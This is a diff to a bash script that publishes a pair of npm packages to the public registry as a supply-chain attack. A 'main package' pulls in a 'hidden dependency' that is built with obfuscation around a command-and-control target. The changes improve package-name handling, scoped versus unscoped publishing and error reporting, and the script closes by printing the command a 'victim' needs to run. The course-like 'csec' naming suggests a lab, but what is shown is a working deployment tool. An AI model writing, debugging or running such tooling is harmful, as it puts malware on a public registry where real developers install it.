@@ -22,25 +22,36 @@ fi
 echo -e "  ${G}[✓]${X} Logged in as: ${B}${NPM_USER}${X}"
 echo ""
 
-# --- Validate scope is set ---
-SCOPE="@${NPM_USER}"
-FORM_PKG="${SCOPE}/csec-form-helpers"
-CRYPTO_PKG="${SCOPE}/csec-crypto-utils"
-
 FORM_DIR="$SCRIPT_DIR/csec-form-helpers"
 CRYPTO_DIR="$SCRIPT_DIR/csec-crypto-utils"
 
+# Package names come from package.json (unscoped: csec-form-helpers, or scoped: @user/csec-form-helpers)
+FORM_PKG=$(node -e "console.log(require('$FORM_DIR/package.json').name)")
+CRYPTO_PKG=$(node -e "console.log(require('$CRYPTO_DIR/package.json').name)")
+
+SCOPE="@${NPM_USER}"
 grep -q "@yourname" "$FORM_DIR/package.json" && NEEDS_PATCH=1 || NEEDS_PATCH=0
 grep -q "@yourname" "$CRYPTO_DIR/package.json" && NEEDS_PATCH=1
 
 if [ "$NEEDS_PATCH" = "1" ]; then
-  echo -e "  ${Y}[*]${X} Patching package names with your scope: ${B}${SCOPE}${X}"
+  echo -e "  ${Y}[*]${X} Patching @yourname → ${B}${SCOPE}${X}"
   sed -i "s|@yourname/|${SCOPE}/|g" "$FORM_DIR/package.json"
   sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.json"
   sed -i "s|@yourname/|${SCOPE}/|g" "$CRYPTO_DIR/package.md"
-  echo -e "  ${G}[✓]${X} Patched all package.json files"
+  FORM_PKG=$(node -e "console.log(require('$FORM_DIR/package.json').name)")
+  CRYPTO_PKG=$(node -e "console.log(require('$CRYPTO_DIR/package.json').name)")
+  echo -e "  ${G}[✓]${X} Patched package names"
   echo ""
 fi
+
+if [[ "$FORM_PKG" == @* ]]; then
+  NPM_ACCESS=(--access public)
+  echo -e "  ${D}Scoped packages — publishing with --access public${X}"
+else
+  NPM_ACCESS=()
+  echo -e "  ${D}Unscoped names — global registry (name must not be taken)${X}"
+fi
+echo ""
 
 # --- Get C2 target ---
 C2_TARGET="${1}"
@@ -82,21 +93,53 @@ else
   node "$SCRIPT_DIR/build-obfuscated.js" "$C2_TARGET"
 fi
 
+PUBLISH_FAILED=0
+
 # --- Publish hidden dependency first ---
 echo -e "${Y}${B}  ── Step 2: Publishing ${CRYPTO_PKG} (hidden dependency) ──${X}"
 cd "$CRYPTO_DIR"
-npm publish --access public 2>&1 && \
-  echo -e "  ${G}[✓]${X} Published ${CRYPTO_PKG}@4.2.1" || \
-  echo -e "  ${Y}[!]${X} May already be published — check npm"
+set +e
+npm publish "${NPM_ACCESS[@]}" 2>&1
+EC_CRYPTO=$?
+set -e
+CRYPTO_VER=$(node -e "console.log(require('$CRYPTO_DIR/package.json').version)")
+if [ "$EC_CRYPTO" -eq 0 ]; then
+  echo -e "  ${G}[✓]${X} Published ${CRYPTO_PKG}@${CRYPTO_VER}"
+else
+  echo -e "  ${R}[✗]${X} npm publish failed (exit $EC_CRYPTO)"
+  PUBLISH_FAILED=1
+fi
 echo ""
 
 # --- Publish main package ---
 echo -e "${Y}${B}  ── Step 3: Publishing ${FORM_PKG} (main package) ──${X}"
 cd "$FORM_DIR"
-npm publish --access public 2>&1 && \
-  echo -e "  ${G}[✓]${X} Published ${FORM_PKG}@1.0.0" || \
-  echo -e "  ${Y}[!]${X} May already be published — check npm"
+set +e
+npm publish "${NPM_ACCESS[@]}" 2>&1
+EC_FORM=$?
+set -e
+FORM_VER=$(node -e "console.log(require('$FORM_DIR/package.json').version)")
+if [ "$EC_FORM" -eq 0 ]; then
+  echo -e "  ${G}[✓]${X} Published ${FORM_PKG}@${FORM_VER}"
+else
+  echo -e "  ${R}[✗]${X} npm publish failed (exit $EC_FORM)"
+  PUBLISH_FAILED=1
+fi
 echo ""
+
+if [ "$PUBLISH_FAILED" -ne 0 ]; then
+  echo -e "${R}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
+  echo -e "${R}${B}  ║              PUBLISH FAILED — NOT ON npm                  ║${X}"
+  echo -e "${R}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
+  echo ""
+  echo -e "  ${Y}Common fix (E403):${X} npm requires **2FA** or a **granular access token**"
+  echo -e "  with permission to publish. On npmjs.com:"
+  echo -e "    ${D}Profile → Access Tokens → Generate New Token → Granular Access${X}"
+  echo -e "    ${D}Enable “Publish”, then:${X} ${C}npm login --auth-type=legacy${X} (or set token in ~/.npmrc)"
+  echo -e "  Or enable 2FA on your account and use ${C}npm publish${X} again (OTP when prompted)."
+  echo ""
+  exit 1
+fi
 
 # --- Done ---
 echo -e "${G}${B}  ╔═══════════════════════════════════════════════════════════╗${X}"
@@ -104,7 +147,7 @@ echo -e "${G}${B}  ║                  PACKAGES PUBLISHED                      
 echo -e "${G}${B}  ╚═══════════════════════════════════════════════════════════╝${X}"
 echo ""
 echo -e "  ${C}${B}Main package:${X}     npm install ${FORM_PKG}"
-echo -e "  ${C}${B}Hidden dep:${X}       ${CRYPTO_PKG}@4.2.1 (pulled automatically)"
+echo -e "  ${C}${B}Hidden dep:${X}       ${CRYPTO_PKG}@${CRYPTO_VER} (pulled automatically)"
 echo -e "  ${C}${B}C2 target:${X}        ${C2_TARGET}"
 echo ""
 echo -e "  ${Y}${B}── Victim just needs to run: ──${X}"
